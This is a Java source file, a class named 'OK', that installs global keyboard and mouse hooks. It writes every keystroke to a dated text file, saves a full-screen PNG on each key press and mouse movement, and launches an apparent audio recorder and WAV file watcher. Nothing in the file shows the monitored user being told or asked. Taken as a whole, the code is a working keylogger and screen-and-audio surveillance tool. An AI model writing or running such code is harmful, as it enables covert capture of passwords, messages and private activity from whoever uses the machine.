package org.deb;

import java.awt.AWTException;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import javax.imageio.ImageIO;

import org.apache.log4j.Logger;
import org.deb.recorder.DebRecorder;
import org.deb.recorder.WAVFileWatcher;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

public class OK implements NativeKeyListener, NativeMouseInputListener {
	public static final String DIR = "Images";
	private static Robot myRobot = null;
	private static Rectangle screenRect = null;
	private static PrintWriter writer = null;
	private static int mouse_x;
	private static int mouse_y;

	private static final Logger debugLog = Logger.getLogger("debugLogger");

	private static final Logger errorLog = Logger.getLogger("errorLogger");

	static {
		try {
			int width = GraphicsEnvironment.getLocalGraphicsEnvironment().getMaximumWindowBounds().width;
			int height = GraphicsEnvironment.getLocalGraphicsEnvironment().getMaximumWindowBounds().height;

			screenRect = new Rectangle(width, height);

			String directoryName = getDate("ddMMyyyy");
			File directory = new File("Images" + File.separator + directoryName);
			if (!directory.exists()) {
				directory.mkdirs();
			}
			String fileName = "Images" + File.separator + directoryName + File.separator + getDate("ddMMyyyy") + ".txt";
			FileOutputStream fos = new FileOutputStream(fileName, true);
			writer = new PrintWriter(fos, true);

			myRobot = new Robot();
		} catch (AWTException e) {
			errorLog.error("ERR AWTException:" + e.getMessage(), e);
		} catch (IOException e) {
			errorLog.error("ERR IOException:" + e.getMessage(), e);
		}
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String typed = NativeKeyEvent.getKeyText(e.getKeyCode());
		if ("Space".equals(typed)) {
			typed = " ";
		} else if ("Backspace".equals(typed)) {
			typed = " <-- ";
		} else if ("Left".equals(typed)) {
			typed = "<-";
		} else if ("Right".equals(typed)) {
			typed = "->";
		} else if ("Comma".equals(typed)) {
			typed = ",";
		} else if ("Minus".equals(typed)) {
			typed = "-";
		} else if ("Period".equals(typed)) {
			typed = ".";
		}
		if (writer != null) {
			writer.printf("%s", new Object[] { typed });
		} else {
			errorLog.error("Writer is null");
		}
		debugLog.debug(NativeKeyEvent.getModifiersText(e.getModifiers()));
		screenCapture();
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	}

	public static void main(String[] args) {
		DebRecorder debRecorder = new DebRecorder();
		Thread raju = new Thread(debRecorder);
		raju.start();
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			errorLog.error("There was a problem registering the native hook." ,ex);
		}
		GlobalScreen.addNativeKeyListener(new OK());
		GlobalScreen.addNativeMouseListener(new OK());

		WAVFileWatcher watcher = new WAVFileWatcher();
		watcher.setDebRecorder(debRecorder);
		Thread watcherThread = new Thread(watcher);
		watcherThread.start();
	}

	public void nativeMouseClicked(NativeMouseEvent e) {
		detectMouseMovement(e, "nativeMouseClicked");
	}

	public void nativeMousePressed(NativeMouseEvent e) {
	}

	public void nativeMouseReleased(NativeMouseEvent e) {
	}

	private void detectMouseMovement(NativeMouseEvent e, String eventName) {
		int x = e.getX();
		int y = e.getY();
		if ((x != mouse_x) && (y != mouse_y)) {
			mouse_x = x;
			mouse_y = y;
			screenCapture();
		}
	}

	public void nativeMouseMoved(NativeMouseEvent e) {
		detectMouseMovement(e, "nativeMouseMoved");
	}

	public void nativeMouseDragged(NativeMouseEvent e) {
	}

	public static String getDate(String format) {
		Date d = Calendar.getInstance().getTime();
		SimpleDateFormat sdf = new SimpleDateFormat(format);

		return sdf.format(d);
	}

	private static void screenCapture() {
		if (myRobot == null) {
			try {
				myRobot = new Robot();
			} catch (AWTException e) {
				errorLog.error("ERR AWTException:" + e.getMessage(), e);
			}
		}
		String directoryName = getDate("ddMMyyyy");
		BufferedImage capturedEvent = myRobot.createScreenCapture(screenRect);
		myRobot.setAutoDelay(2000);
		File directory = new File("Images" + File.separator + directoryName);
		if (!directory.exists()) {
			directory.mkdirs();
		}
		String currentFileName = directory + File.separator + getDate("ddMMyyyy_HHmmss") + ".PNG";
		File imageFile = new File(currentFileName);
		try {
			ImageIO.write(capturedEvent, "png", imageFile);
		} catch (IOException e) {
			errorLog.error("ERR :" + e.getMessage());
		}
		capturedEvent.flush();
	}

	protected void finalize() throws Throwable {
		if (writer != null) {
			writer.close();
		}
	}
}
